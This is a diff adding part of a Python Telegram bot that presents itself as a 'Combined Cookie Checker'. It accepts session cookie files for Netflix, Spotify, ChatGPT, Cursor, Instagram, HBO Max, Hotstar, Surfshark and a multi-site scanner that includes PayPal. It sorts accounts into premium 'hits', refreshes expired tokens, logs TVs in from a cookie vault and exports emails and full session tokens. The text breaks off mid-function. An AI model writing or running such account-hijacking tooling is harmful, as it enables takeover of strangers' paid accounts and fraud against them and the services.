@@ -1,0 +1,2228 @@
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    IN-MEMORY USER STATE                                 ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+SERVICES = {
+    "surfshark": "🛡 Surfshark",
+    "spotify":   "🎵 Spotify",
+    "hotstar":   "🎯 JioHotstar",
+    "netflix":   "🎬 Netflix",
+    "hbomax":    "🎬 HBO Max",
+    "chatgpt":   "💬 ChatGPT",
+    "cursor":    "⚡ Cursor",
+    "instagram": "📸 Instagram",
+    "scan":      "🌐 Cookie Scanner",
+}
+
+def _fresh_state():
+    return {
+        "mode":       "surfshark",
+        "processing": False,
+        # Surfshark
+        "ss_premium": [], "ss_free": [], "ss_dead": [], "ss_total": 0,
+        "ss_awaiting_code": False, "ss_login_data": None,
+        # Spotify
+        "sp_premium": [], "sp_free": [], "sp_dead": [], "sp_total": 0,
+        "sp_awaiting_tv": False, "sp_tv_data": None,
+        # JioHotstar
+        "hs_live": [], "hs_device": [], "hs_free": [], "hs_invalid": [], "hs_total": 0,
+        "hs_awaiting_qr":    False,
+        "hs_vault_upload":   False,
+        # Netflix
+        "nf_premium": [], "nf_free": [], "nf_dead": [], "nf_tokens": [], "nf_total": 0,
+        "nf_sub":          "check",
+        "nf_awaiting_tv":  False,
+        "nf_vault_upload": False,
+        # HBO Max
+        "hbo_live": [], "hbo_dead": [], "hbo_total": 0,
+        "hbo_awaiting_tv": False, "hbo_tv_data": None,
+        # ChatGPT
+        "cg_premium": [], "cg_free": [], "cg_dead": [], "cg_total": 0,
+        # Cursor
+        "cur_pro": [], "cur_free": [], "cur_dead": [], "cur_total": 0,
+        # Instagram
+        "ig_live": [], "ig_dead": [], "ig_total": 0,
+        # Cookie Scanner
+        "scan_live": [], "scan_dead": [], "scan_total": 0,
+    }
+
+user_results: dict = defaultdict(_fresh_state)
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    KEYBOARDS                                            ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+def _btn(text: str, callback_data: str = None, url: str = None,
+         icon_id: str = None, style: str = "primary") -> dict:
+    btn: dict = {"text": text}
+    if callback_data:
+        btn["callback_data"] = callback_data
+    if url:
+        btn["url"] = url
+    btn["icon_custom_emoji_id"] = icon_id or ""
+    btn["style"] = style
+    return btn
+
+
+def main_markup(mode: str) -> dict:
+    rows = [
+        [
+            _btn(bold("Results ZIP"), "get_results", icon_id="5408843502027033965", style="primary"),
+            _btn(bold("Stats"),       "view_stats",  icon_id="5931472654660800739", style="primary"),
+        ],
+    ]
+    if mode == "surfshark":
+        rows.append([
+            _btn(bold("Login Device"), "ss_login_device", icon_id="6005570495603282482", style="success"),
+            _btn(bold("Clear"),         "clear_all",       icon_id="5408832111773757273", style="danger"),
+        ])
+    elif mode == "spotify":
+        rows.append([
+            _btn(bold("Activate TV"), "sp_activate_tv", icon_id="5332726004253212527", style="success"),
+            _btn(bold("Clear"),        "clear_all",      icon_id="5408832111773757273", style="danger"),
+        ])
+    elif mode == "hotstar":
+        rows.append([
+            _btn(bold("Activate TV"),  "hs_activate_qr",  icon_id="5332726004253212527", style="success"),
+            _btn(bold("Upload Vault"), "hs_vault_upload",  icon_id="6030822047150512346", style="primary"),
+        ])
+        rows.append([
+            _btn(bold("Clear"), "clear_all", icon_id="5408832111773757273", style="danger"),
+        ])
+    elif mode == "netflix":
+        rows.append([
+            _btn(bold("Check Account"), "nf_sub_check",   icon_id="5444989577422993015", style="primary"),
+            _btn(bold("NF Token"),       "nf_sub_nftoken", icon_id="6005570495603282482", style="primary"),
+        ])
+        rows.append([
+            _btn(bold("Clean Cookies"), "nf_sub_clean",   icon_id="5845945815549350824", style="primary"),
+            _btn(bold("TV Login"),       "nf_sub_tvlogin", icon_id="5332726004253212527", style="success"),
+        ])
+        rows.append([
+            _btn(bold("Upload Vault"), "nf_vault_upload", icon_id="6030822047150512346", style="primary"),
+            _btn(bold("Clear"),         "clear_all",       icon_id="5408832111773757273", style="danger"),
+        ])
+    elif mode == "hbomax":
+        rows.append([
+            _btn(bold("Activate TV"), "hbo_activate_tv", icon_id="5332726004253212527", style="success"),
+            _btn(bold("Clear"),        "clear_all",       icon_id="5408832111773757273", style="danger"),
+        ])
+    elif mode in ("chatgpt", "cursor", "instagram", "scan"):
+        rows.append([
+            _btn(bold("Clear"), "clear_all", icon_id="5408832111773757273", style="danger"),
+        ])
+    rows.append([
+        _btn(bold("Format Guide"),   "format_help",    icon_id="5897846616966041652", style="primary"),
+        _btn(bold("Switch Service"), "switch_service", icon_id="5408940598352687316", style="primary"),
+    ])
+    return {"inline_keyboard": rows}
+
+
+def _service_markup() -> dict:
+    return {"inline_keyboard": [
+        [_btn(bold("Surfshark"),  "mode_surfshark", icon_id="6037533655105016950", style="primary")],
+        [_btn(bold("Spotify"),    "mode_spotify",   icon_id="5206361550939506453", style="success")],
+        [_btn(bold("JioHotstar"), "mode_hotstar",   icon_id="5035052828968617761", style="primary")],
+        [_btn(bold("Netflix"),    "mode_netflix",   icon_id="5332726004253212527", style="danger")],
+        [_btn(bold("HBO Max"),    "mode_hbomax",    icon_id="4986012398461649574", style="danger")],
+        [_btn(bold("ChatGPT"),    "mode_chatgpt",   icon_id="6134246530380472478", style="success")],
+        [_btn(bold("Cursor"),     "mode_cursor",    icon_id="6273793612715138423", style="primary")],
+        [_btn(bold("Instagram"),  "mode_instagram", icon_id="5319160079465857105", style="danger")],
+        [_btn(bold("Cookie Scan"),"mode_scan",      icon_id="6012792650615230712", style="success")],
+    ]}
+
+
+def _nf_tv_cancel_markup() -> dict:
+    return {"inline_keyboard": [[
+        _btn(bold("Cancel TV Login"), "nf_cancel_tv", icon_id="5778527486270770928", style="danger"),
+    ]]}
+
+def _nf_vault_cancel_markup() -> dict:
+    return {"inline_keyboard": [[
+        _btn(bold("Cancel Upload"), "nf_cancel_vault_upload", icon_id="5778527486270770928", style="danger"),
+    ]]}
+
+def _ss_cancel_markup() -> dict:
+    return {"inline_keyboard": [[
+        _btn(bold("Cancel Login"), "ss_cancel_login", icon_id="5778527486270770928", style="danger"),
+    ]]}
+
+def _sp_cancel_markup() -> dict:
+    return {"inline_keyboard": [[
+        _btn(bold("Cancel"), "sp_cancel_tv", icon_id="5778527486270770928", style="danger"),
+    ]]}
+
+def _hs_qr_cancel_markup() -> dict:
+    return {"inline_keyboard": [[
+        _btn(bold("Cancel QR Activation"), "hs_cancel_qr", icon_id="5778527486270770928", style="danger"),
+    ]]}
+
+def _hs_vault_cancel_markup() -> dict:
+    return {"inline_keyboard": [[
+        _btn(bold("Cancel Upload"), "hs_cancel_vault_upload", icon_id="5778527486270770928", style="danger"),
+    ]]}
+
+def _hbo_cancel_markup() -> dict:
+    return {"inline_keyboard": [[
+        _btn(bold("Cancel TV Activation"), "hbo_cancel_tv", icon_id="5778527486270770928", style="danger"),
+    ]]}
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    START / WELCOME TEXT                                 ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+def start_text(mode: str) -> str:
+    label = SERVICES.get(mode, "?")
+    if mode == "surfshark":
+        return (
+            f"{SS_SHIELD} <b>Combined Cookie Checker</b>\n\n"
+            f"Active service: <b>{label}</b>\n\n"
+            f"Send a <code>.txt</code>, <code>.json</code>, or <code>.zip</code> cookie file.\n\n"
+            f"{SS_PREMIUM} <b>PREMIUM</b>  — Active paid subscription\n"
+            f"{SS_FREE} <b>FREE</b>     — Expired / canceled\n"
+            f"{SS_DEAD} <b>DEAD</b>     — Invalid or unreadable\n"
+            f"{SS_REVIVED} <b>Auto-Revive</b> — Expired _sstk refreshed via _ssrtk\n\n"
+            f"Tap <b>{E_WRENCH} Switch Service</b> to change checker."
+        )
+    elif mode == "spotify":
+        return (
+            f"{SP_MUSIC} <b>Combined Cookie Checker</b>\n\n"
+            f"Active service: <b>{label}</b>\n\n"
+            f"Send a <code>.txt</code>, <code>.json</code>, or <code>.zip</code> cookie file.\n\n"
+            f"{SP_PREMIUM} Premium  ·  {SP_FREE} Free  ·  {SP_DEAD} Dead\n\n"
+            f"Use <b>{SP_TV} Activate TV</b> to log a device in.\n"
+            f"Tap <b>{E_WRENCH} Switch Service</b> to change checker."
+        )
+    elif mode == "hotstar":
+        vault_total = hs_vault_count()
+        vault_avail = hs_vault_available_count()
+        return (
+            f"{HS_TARGET} <b>Combined Cookie Checker</b>\n\n"
+            f"Active service: <b>{label}</b>\n\n"
+            f"Send a <code>.txt</code>, <code>.json</code>, or <code>.zip</code> cookie file.\n\n"
+            f"{HS_LIVE} <b>LIVE</b>         — Active premium subscription\n"
+            f"{HS_DEVICE} <b>DEVICE LIMIT</b> — Premium but session kicked\n"
+            f"{HS_FREE} <b>FREE</b>         — No active subscription\n"
+            f"{HS_INVALID} <b>INVALID</b>     — Bad / expired cookie\n\n"
+            f"{HS_TV} <b>QR TV Login</b> — Activate your TV via QR code\n"
+            f"   Vault: <b>{vault_avail}</b> available / <b>{vault_total}</b> total\n\n"
+            f"Tap <b>{E_WRENCH} Switch Service</b> to change checker."
+        )
+    elif mode == "netflix":
+        nf_vault = nf_vault_count()
+        return (
+            f"{SP_MUSIC} <b>Combined Cookie Checker</b>\n\n"
+            f"Active service: <b>{label}</b>\n\n"
+            f"{SP_PREMIUM} <b>Check Account</b>  — Full account info + plan\n"
+            f"{SP_CODE} <b>NF Token</b>       — Generate iOS token link\n"
+            f"{SP_SPARK} <b>Clean Cookies</b>  — Deduplicate &amp; reformat\n"
+            f"{SP_TV} <b>TV Login</b>       — 8-digit code via vault\n"
+            f"   TV Vault: <b>{nf_vault}</b> cookie(s) available\n\n"
+            f"Pick a mode below, then send a cookie file.\n"
+            f"Tap <b>{E_WRENCH} Switch Service</b> to change checker."
+        )
+    elif mode == "hbomax":
+        return (
+            f"{HBO_ICON} <b>Combined Cookie Checker</b>\n\n"
+            f"Active service: <b>{label}</b>\n\n"
+            f"Send a <code>.txt</code>, <code>.json</code>, or <code>.zip</code> cookie file.\n\n"
+            f"{HBO_LIVE} <b>LIVE</b> — Valid account with active subscription\n"
+            f"{HBO_DEAD} <b>DEAD</b> — Expired / invalid cookie\n\n"
+            f"{HBO_TV} <b>Activate TV</b> — Enter the 6-digit code shown on your TV\n\n"
+            f"Tap <b>{E_WRENCH} Switch Service</b> to change checker."
+        )
+    elif mode == "chatgpt":
+        return (
+            f"{CG_EMOJI} <b>ChatGPT Cookie Checker</b>\n\n"
+            f"Active service: <b>{label}</b>\n\n"
+            f"Send a <code>.txt</code> file with ChatGPT cookies\n"
+            f"(Netscape format with <code>__Secure-next-auth.session-token</code>)\n\n"
+            f"{CG_PREMIUM} Premium  ·  {CG_FREE} Free  ·  {CG_DEAD} Dead\n\n"
+            f"Tap <b>{E_WRENCH} Switch Service</b> to change checker."
+        )
+    elif mode == "cursor":
+        return (
+            f"{CUR_EMOJI} <b>Cursor Cookie Analyzer</b>\n\n"
+            f"Active service: <b>{label}</b>\n\n"
+            f"Send a <code>.txt</code> file with Cursor cookies\n"
+            f"(WorkosCursorSessionToken JWT)\n\n"
+            f"{CUR_PRO} PRO  ·  {CUR_FREE} Free  ·  {CUR_DEAD} Dead\n\n"
+            f"Tap <b>{E_WRENCH} Switch Service</b> to change checker."
+        )
+    elif mode == "instagram":
+        return (
+            f"{IG_EMOJI} <b>Instagram Cookie Checker</b>\n\n"
+            f"Active service: <b>{label}</b>\n\n"
+            f"Send a <code>.txt</code> file with Instagram cookies\n"
+            f"(Netscape: sessionid, ds_user_id, csrftoken, mid)\n\n"
+            f"{IG_LIVE} Live  ·  {IG_DEAD} Dead\n\n"
+            f"Tap <b>{E_WRENCH} Switch Service</b> to change checker."
+        )
+    else:  # scan
+        return (
+            f"{SCAN_EMOJI} <b>Cookie Scanner</b>\n\n"
+            f"Active service: <b>{label}</b>\n\n"
+            f"Send a <code>.txt</code> file with Netscape cookies\n"
+            f"Detects and tests <b>13 services</b>:\n"
+            f"Netflix · Spotify · Facebook · Instagram · TikTok\n"
+            f"YouTube · LinkedIn · Amazon · Roblox · Canva\n"
+            f"WordPress · CapCut · PayPal\n\n"
+            f"{SCAN_LIVE} Live  ·  {SCAN_DEAD} Dead\n\n"
+            f"Tap <b>{E_WRENCH} Switch Service</b> to change checker."
+        )
+
+
+FORMAT_TEXTS = {
+    "surfshark": (
+        f"{E_HELP} <b>Surfshark Cookie Format</b>\n\n"
+        "<b>1. Netscape (.txt)</b>\n"
+        "<code>#HttpOnly_.surfshark.com TRUE / TRUE 0 _sstk VALUE</code>\n"
+        "<code>#HttpOnly_.surfshark.com TRUE / TRUE 0 _ssrtk VALUE</code>\n\n"
+        "<b>2. Key=Value</b>\n"
+        "<code>_sstk=VALUE\n_ssrtk=VALUE</code>\n\n"
+        "<b>Tokens used:</b>\n"
+        "• <code>_sstk</code>  — Access token (JWT)\n"
+        "• <code>_ssrtk</code> — Refresh token for auto-revive"
+    ),
+    "spotify": (
+        f"{E_HELP} <b>Spotify Cookie Format</b>\n\n"
+        "<b>1. Netscape (tab-separated)</b>\n"
+        "<code>.spotify.com  TRUE  /  FALSE  0  sp_dc  VALUE</code>\n\n"
+        "<b>2. Key=Value</b>\n"
+        "<code>sp_dc=VALUE</code>\n\n"
+        "<b>3. JSON array</b>\n"
+        '<code>[{"name":"sp_dc","value":"VALUE"}]</code>'
+    ),
+    "hotstar": (
+        f"{E_HELP} <b>JioHotstar Cookie Format</b>\n\n"
+        "<b>Required:</b> <code>sessionUserUP</code>, <code>userUP</code>, <code>deviceId</code>\n\n"
+        "<b>Netscape / JSON / key=value supported.</b>"
+    ),
+    "netflix": (
+        f"{E_HELP} <b>Netflix Cookie Format</b>\n\n"
+        "<b>Required cookie:</b>  <code>NetflixId</code>\n\n"
+        "<b>1. Netscape (.txt)</b>\n"
+        "<code>.netflix.com TRUE / FALSE 0 NetflixId VALUE</code>\n\n"
+        "<b>2. JSON array</b>\n"
+        '<code>[{"name":"NetflixId","value":"VALUE"}]</code>\n\n'
+        "<b>3. JSON flat</b>\n"
+        '<code>{"NetflixId":"VALUE","SecureNetflixId":"VALUE"}</code>\n\n'
+        "<b>4. Key=Value</b>\n"
+        "<code>NetflixId=VALUE</code>"
+    ),
+    "hbomax": (
+        f"{E_HELP} <b>HBO Max Cookie Format</b>\n\n"
+        "<b>Required token:</b>  <code>st</code> (session token — a JWT)\n\n"
+        "<b>1. Key=Value</b>\n"
+        "<code>st=eyJ...</code>\n\n"
+        "<b>2. Netscape (.txt)</b>\n"
+        "<code>.hbomax.com TRUE / FALSE 0 st eyJ...</code>\n\n"
+        "<b>3. Raw JWT</b>\n"
+        "<code>eyJhbGciOi...</code>"
+    ),
+    "chatgpt": (
+        f"{E_HELP} <b>ChatGPT Cookie Format</b>\n\n"
+        "<b>Required:</b> <code>__Secure-next-auth.session-token</code>\n\n"
+        "<b>Formats supported:</b>\n"
+        "• Netscape (.txt) with tab-separated values\n"
+        "• Blocks separated by <code>#----#</code> lines\n"
+        "• Raw key=value lines"
+    ),
+    "cursor": (
+        f"{E_HELP} <b>Cursor Cookie Format</b>\n\n"
+        "<b>Required:</b> <code>WorkosCursorSessionToken</code> (JWT)\n\n"
+        "<b>Formats supported:</b>\n"
+        "• Netscape (.txt)\n"
+        "• JSON objects (one per line)\n"
+        "• Raw JWT (paste the token on its own line)\n"
+        "• <code>WorkosCursorSessionToken=eyJ...</code>"
+    ),
+    "instagram": (
+        f"{E_HELP} <b>Instagram Cookie Format</b>\n\n"
+        "<b>Required:</b> <code>sessionid</code>, <code>ds_user_id</code>, "
+        "<code>csrftoken</code>, <code>mid</code>\n\n"
+        "<b>Netscape (.txt)</b>\n"
+        "<code>.instagram.com TRUE / FALSE 0 sessionid VALUE</code>"
+    ),
+    "scan": (
+        f"{E_HELP} <b>Cookie Scanner Format</b>\n\n"
+        "Send one <code>.txt</code> with Netscape cookies for any of:\n"
+        "Netflix · Spotify · Facebook · Instagram · TikTok · YouTube\n"
+        "LinkedIn · Amazon · Roblox · Canva · WordPress · CapCut · PayPal\n\n"
+        "Each cookie line: <code>domain\\tTRUE\\t/\\tFALSE\\texpiry\\tname\\tvalue</code>"
+    ),
+}
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    RESULTS ZIP SENDERS                                  ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+async def _send_zip(chat_id, uid, bot: Bot):
+    r    = user_results[uid]
+    mode = r["mode"]
+
+    if mode == "surfshark":
+        premium = r["ss_premium"]; free = r["ss_free"]; dead = r["ss_dead"]
+        total   = r["ss_total"]
+        if not total:
+            await bot.send_message(chat_id, f"{E_EMPTY} No Surfshark results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
+            return
+        revived = sum(1 for x in premium if x.get("revived"))
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            for res in premium:
+                plan_slug  = re.sub(r"[^\w]", "_", res.get("plan", "Unknown"))
+                email_slug = re.sub(r"[^\w\-_]", "_", res.get("email", "unk").split("@")[0])
+                zf.writestr(f"premium/{plan_slug}/{email_slug}_{res.get('expires_at','unk')}.txt", res.get("content", ""))
+            for res in free:
+                email_slug = re.sub(r"[^\w\-_]", "_", res.get("email", "unk").split("@")[0])
+                zf.writestr(f"free/free_{email_slug}.txt", res.get("content", ""))
+            lines = [
+                "Surfshark Cookie Check Summary", "=" * 50,
+                f"Total   : {total}", f"Premium : {len(premium)}", f"Free    : {len(free)}",
+                f"Dead    : {len(dead)}", f"Revived : {revived}", "", "── PREMIUM DETAILS ──",
+            ]
+            for res in premium:
+                lines.append(
+                    f"  {res.get('email','?'):<32} | {res.get('plan','?'):<28} "
+                    f"| {res.get('days_left','?')} days | exp {res.get('expires_at','?')}"
+                )
+            lines.append(f"\nGenerated: {datetime.now():%Y-%m-%d %H:%M:%S}")
+            zf.writestr("summary.txt", "\n".join(lines))
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        cap = (f"{E_ZIP} <b>Surfshark Results — {ts}</b>\n\n"
+               f"{SS_PREMIUM} Premium : <b>{len(premium)}</b>\n"
+               f"{SS_FREE} Free    : <b>{len(free)}</b>\n"
+               f"{SS_DEAD} Dead    : <b>{len(dead)}</b>\n"
+               f"{E_COUNT} Total   : <b>{total}</b>")
+        await bot.send_document(chat_id,
+            document=BufferedInputFile(buf.getvalue(), filename=f"surfshark_results_{ts}.zip"),
+            caption=cap, parse_mode="HTML", reply_markup=main_markup(mode))
+
+    elif mode == "spotify":
+        premium = r["sp_premium"]; free = r["sp_free"]; dead = r["sp_dead"]
+        total   = r["sp_total"]
+        if not total:
+            await bot.send_message(chat_id, f"{E_EMPTY} No Spotify results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
+            return
+        tmp = tempfile.mktemp(suffix=".zip")
+        try:
+            with zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zf:
+                for res in premium + free + dead:
+                    folder = {"PREMIUM": "premium", "FREE": "free", "DEAD": "dead"}.get(res["status"], "dead")
+                    name   = re.sub(r"[^\w\-.]", "_", res.get("filename", "cookie")) or "cookie.txt"
+                    zf.writestr(f"{folder}/{name}", res.get("content", ""))
+            ts = int(time.time())
+            await bot.send_document(
+                chat_id,
+                document=FSInputFile(tmp, filename=f"spotify_results_{ts}.zip"),
+                caption=(f"{E_ZIP}  <b>Spotify Results</b>\n"
+                         f"{SP_PREMIUM} Premium: <b>{len(premium)}</b>  "
+                         f"{SP_FREE} Free: <b>{len(free)}</b>  "
+                         f"{SP_DEAD} Dead: <b>{len(dead)}</b>"),
+                parse_mode="HTML", reply_markup=main_markup(mode),
+            )
+        finally:
+            try:
+                os.remove(tmp)
+            except Exception:
+                pass
+
+    elif mode == "netflix":
+        premium = r["nf_premium"]; free_l = r["nf_free"]
+        dead    = r["nf_dead"];    tokens = r["nf_tokens"]
+        total   = r["nf_total"];   sub    = r.get("nf_sub", "check")
+        if not total:
+            await bot.send_message(chat_id, f"{E_EMPTY} No Netflix results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
+            return
+        if sub == "nftoken":
+            buf = io.BytesIO()
+            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                for idx, res in enumerate(tokens, 1):
+                    zf.writestr(f"tokens/token_{idx}.txt", nf_build_token_export(res, idx))
+                zf.writestr("summary.txt", f"Netflix Token Gen\nTotal: {total}\nTokens: {len(tokens)}\nFailed: {len(dead)}\nGenerated: {datetime.now():%Y-%m-%d %H:%M:%S}")
+            ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+            cap = (f"{E_ZIP} <b>Netflix Tokens — {ts}</b>\n\n"
+                   f"{SP_CODE} Tokens : <b>{len(tokens)}</b>\n"
+                   f"{SP_DEAD} Failed : <b>{len(dead)}</b>\n"
+                   f"{E_COUNT} Total  : <b>{total}</b>")
+            await bot.send_document(chat_id,
+                document=BufferedInputFile(buf.getvalue(), filename=f"netflix_tokens_{ts}.zip"),
+                caption=cap, parse_mode="HTML", reply_markup=main_markup(mode))
+        else:
+            buf = io.BytesIO()
+            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                for idx, res in enumerate(premium, 1):
+                    plan_slug = re.sub(r"[^\w]", "_", res.get("plan", "Unknown"))
+                    zf.writestr(f"premium/{plan_slug}/hit_{idx}.txt", nf_build_export(res, idx))
+                for idx, res in enumerate(free_l, 1):
+                    zf.writestr(f"free/free_{idx}.txt", nf_build_export(res, idx))
+                lines = [
+                    "Netflix Cookie Check Summary", "=" * 50,
+                    f"Total   : {total}", f"Premium : {len(premium)}", f"Free    : {len(free_l)}",
+                    f"Dead    : {len(dead)}", "", "── PREMIUM ACCOUNTS ──",
+                ]
+                for res in premium:
+                    lines.append(f"  {res.get('email','?'):<32} | {res.get('plan','?'):<28} | {res.get('country','?')}")
+                lines.append(f"\nGenerated: {datetime.now():%Y-%m-%d %H:%M:%S}")
+                zf.writestr("summary.txt", "\n".join(lines))
+            ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+            cap = (f"{E_ZIP} <b>Netflix Results — {ts}</b>\n\n"
+                   f"{SP_PREMIUM} Premium : <b>{len(premium)}</b>\n"
+                   f"{SP_FREE} Free    : <b>{len(free_l)}</b>\n"
+                   f"{SP_DEAD} Dead    : <b>{len(dead)}</b>\n"
+                   f"{E_COUNT} Total   : <b>{total}</b>")
+            await bot.send_document(chat_id,
+                document=BufferedInputFile(buf.getvalue(), filename=f"netflix_results_{ts}.zip"),
+                caption=cap, parse_mode="HTML", reply_markup=main_markup(mode))
+
+    elif mode == "hotstar":
+        live    = r["hs_live"]; device = r["hs_device"]
+        free    = r["hs_free"]; invalid = r["hs_invalid"]
+        total   = r["hs_total"]
+        if not total:
+            await bot.send_message(chat_id, f"{E_EMPTY} No Hotstar results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
+            return
+        breakdown = hs_plan_breakdown(live)
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            for res in live:
+                plan_slug = re.sub(r"[^\w]", "_", res.get("plan", "Unknown"))
+                zf.writestr(f"live/{plan_slug}/{res.get('name','unk')}_{res.get('expiry','unk')}.txt",
+                            hs_convert_to_netscape(res.get("cookies", {})))
+            for res in device:
+                plan_slug = re.sub(r"[^\w]", "_", res.get("plan", "Unknown"))
+                zf.writestr(f"device_limit/{plan_slug}/device_{res.get('name','unk')}.txt",
+                            hs_convert_to_netscape(res.get("cookies", {})))
+            for res in free:
+                zf.writestr(f"free/free_{res.get('name','unk')}.txt",
+                            hs_convert_to_netscape(res.get("cookies", {})))
+            lines = [
+                "JioHotstar Check Summary", "=" * 50,
+                f"Checked       : {total}", f"Live          : {len(live)}",
+                f"Device Limit  : {len(device)}", f"Free          : {len(free)}",
+                f"Invalid       : {len(invalid)}", "", "── LIVE — BY PLAN ──",
+            ]
+            for plan, items in sorted(breakdown.items(), key=lambda x: -len(x[1])):
+                lines.append(f"  {plan:<28} : {len(items)} hit(s)")
+            lines.append(f"\nGenerated: {datetime.now():%Y-%m-%d %H:%M:%S}")
+            zf.writestr("summary.txt", "\n".join(lines))
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        bd_cap = "".join(
+            f"\n  {E_PLAN} <b>{plan}</b> — <b>{len(items)}</b>"
+            for plan, items in sorted(breakdown.items(), key=lambda x: -len(x[1]))
+        ) or "  —"
+        cap = (f"{E_ZIP} <b>Hotstar Results — {ts}</b>\n\n"
+               f"{HS_LIVE} Live          : <b>{len(live)}</b>\n"
+               f"{HS_DEVICE} Device Limit  : <b>{len(device)}</b>\n"
+               f"{HS_FREE} Free           : <b>{len(free)}</b>\n"
+               f"{HS_INVALID} Invalid       : <b>{len(invalid)}</b>\n"
+               f"{E_COUNT} Total         : <b>{total}</b>\n\n"
+               f"{E_STATS} <b>Live by Plan:</b>{bd_cap}")
+        await bot.send_document(chat_id,
+            document=BufferedInputFile(buf.getvalue(), filename=f"hotstar_results_{ts}.zip"),
+            caption=cap, parse_mode="HTML", reply_markup=main_markup(mode))
+
+    elif mode == "hbomax":
+        live  = r["hbo_live"]; dead = r["hbo_dead"]; total = r["hbo_total"]
+        if not total:
+            await bot.send_message(chat_id, f"{E_EMPTY} No HBO Max results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
+            return
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            for res in live:
+                email_slug = re.sub(r"[^\w\-_]", "_", res.get("email", "unk").split("@")[0])
+                region     = res.get("region", "unk")
+                zf.writestr(f"live/{region}/{email_slug}.txt", res.get("content", ""))
+            lines = [
+                "HBO Max Cookie Check Summary", "=" * 50,
+                f"Total  : {total}", f"Live   : {len(live)}", f"Dead   : {len(dead)}", "",
+                "── LIVE ACCOUNTS ──",
+            ]
+            for res in live:
+                lines.append(f"  {res.get('email','?'):<36} | {res.get('country','?'):<22} | {res.get('region','?').upper()}")
+            lines.append(f"\nGenerated: {datetime.now():%Y-%m-%d %H:%M:%S}")
+            zf.writestr("summary.txt", "\n".join(lines))
+        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+        cap = (f"{E_ZIP} <b>HBO Max Results — {ts}</b>\n\n"
+               f"{HBO_LIVE} Live   : <b>{len(live)}</b>\n"
+               f"{HBO_DEAD} Dead   : <b>{len(dead)}</b>\n"
+               f"{E_COUNT} Total  : <b>{total}</b>")
+        await bot.send_document(chat_id,
+            document=BufferedInputFile(buf.getvalue(), filename=f"hbomax_results_{ts}.zip"),
+            caption=cap, parse_mode="HTML", reply_markup=main_markup(mode))
+
+    elif mode == "chatgpt":
+        premium = r["cg_premium"]; free = r["cg_free"]; dead = r["cg_dead"]
+        total   = r["cg_total"]
+        if not total:
+            await bot.send_message(chat_id, f"{E_EMPTY} No ChatGPT results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
+            return
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            for idx, hit in enumerate(premium, 1):
+                email_slug = re.sub(r"[^\w\-_]", "_", hit.get("email", "unk").split("@")[0])
+                body = (
+                    f"========== CHATGPT HIT #{idx} ==========\n"
+                    f"Name    : {hit.get('name','Unknown')}\n"
+                    f"Email   : {hit.get('email','Unknown')}\n"
+                    f"Plan    : {hit.get('plan_upper','Unknown')}\n"
+                    f"Expires : {hit.get('expiration','Unknown')}\n"
+                    f"Provider: {hit.get('provider','Unknown')}\n\n"
+                    f"Cookies (Netscape):\n"
+                    f"{cg_format_cookie_netscape('__Secure-next-auth.session-token.0', hit.get('cookie_0',''))}\n"
+                    f"{cg_format_cookie_netscape('__Secure-next-auth.session-token.1', hit.get('cookie_1',''))}\n"
+                )
+                zf.writestr(f"premium/{email_slug}.txt", body)
+        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+        cap = (f"{E_ZIP} <b>ChatGPT Results — {ts}</b>\n\n"
+               f"{CG_PREMIUM} Premium : <b>{len(premium)}</b>\n"
+               f"{CG_FREE} Free    : <b>{len(free)}</b>\n"
+               f"{CG_DEAD} Dead    : <b>{len(dead)}</b>\n"
+               f"{E_COUNT} Total   : <b>{total}</b>")
+        await bot.send_document(chat_id,
+            document=BufferedInputFile(buf.getvalue(), filename=f"chatgpt_results_{ts}.zip"),
+            caption=cap, parse_mode="HTML", reply_markup=main_markup(mode))
+
+    elif mode == "cursor":
+        pro = r["cur_pro"]; free = r["cur_free"]; dead = r["cur_dead"]
+        total = r["cur_total"]
+        if not total:
+            await bot.send_message(chat_id, f"{E_EMPTY} No Cursor results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
+            return
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            for idx, hit in enumerate(pro, 1):
+                email_slug = re.sub(r"[^\w\-_]", "_", hit.get("email", "unk").split("@")[0])
+                body = (
+                    f"========== CURSOR PRO #{idx} ==========\n"
+                    f"Name  : {hit.get('name','Unknown')}\n"
+                    f"Email : {hit.get('email','Unknown')}\n"
+                    f"Plan  : {hit.get('plan','Unknown')}\n"
+                    f"Tier  : {hit.get('tier','Unknown')}\n\n"
+                    f"Token : {hit.get('full_token','')}\n"
+                )
+                zf.writestr(f"pro/{email_slug}.txt", body)
+        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+        cap = (f"{E_ZIP} <b>Cursor Results — {ts}</b>\n\n"
+               f"{CUR_PRO} Pro   : <b>{len(pro)}</b>\n"
+               f"{CUR_FREE} Free  : <b>{len(free)}</b>\n"
